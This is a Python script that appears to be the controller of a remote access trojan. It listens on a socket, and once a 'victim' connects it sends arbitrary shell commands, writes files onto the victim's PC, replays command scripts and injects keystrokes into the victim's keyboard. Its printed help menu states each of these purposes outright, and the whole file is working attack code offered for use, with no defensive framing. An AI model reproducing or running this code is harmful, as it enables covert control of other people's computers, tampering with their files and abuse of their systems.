import socket,time
from pynput.keyboard import Listener
string = ''


def script():
	path = input("enter the path : ")
	with open(path,'r') as f:
		for line in f.readlines():
			if line[:2]=="t#":
				time.sleep(int(line[2:]))
			else:
				client.send(line.encode('utf-8'))
				print()
				print(client.recv(1024).decode('utf-8'))

def write():
	client.send('write'.encode('utf-8'))
	print(client.recv(1024).decode('utf-8'))
	file = input('enter the path of the file : ')
	name = input('enter the name for the file : ')
	mode = input('enter the mode for the file : ')

	if len(mode)==2:
		f=open(file,'rb')
	else:
		f=open(file,'r')

	client.send(f'{name} {mode} {f.read()}'.encode('utf-8'))
	f.close()
	print(client.recv(1024).decode('utf-8'))


def type():
	client.send('type'.encode('utf-8'))
	option=int(input('enter ur choice:\n1)from a file\n2)live\noption : '))
	client.send(str(option).encode('utf-8'))
	if option==1:
		file=input('enter the path of the file : ')
		with open(file,'r') as f:
			client.send(f.read().encode('utf-8'))
	elif option==2:
		def send_keystrokes(key):
			key = str(key)
			global string

			if key=='Key.enter':
				if string=='exit':
					client.send(string.encode('utf-8'))
					return
				else:
					client.send(string+'\n'.encode('utf-8'))
					string=''

			elif key=='Key.space':
				string+=' '
	
			elif 'Key' in key:
				pass

			else:
				string+=key.replace("'","")
		with Listener(on_press=send_keystrokes) as l:
			l.join()
	else:
		print('invalid choice')






def server():
	global client
	HOST = '192.168.43.98'
	PORT = 9090

	server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	server.bind((HOST, PORT))
					
	server.listen()

	client,address = server.accept()
	print(f'connected to {address}\n')

	while True:
		command = input('Enter a command : ')

		if command=='scripts':
			script()

		elif command=='write':
			write()

		elif command=='type':
			type()

		else:
			client.send(command.encode('utf-8'))
			print()
			print(client.recv(1024).decode('utf-8'))



print("""
cmd_on / cmd_off  --> turns on / off of terminal access
type              --> gives controll of the victim's keyboard
read / write      --> allows to read and write files of victim's pc
cd                --> to change dir , since cd command in terminal mode does not work for some reason
""")

server()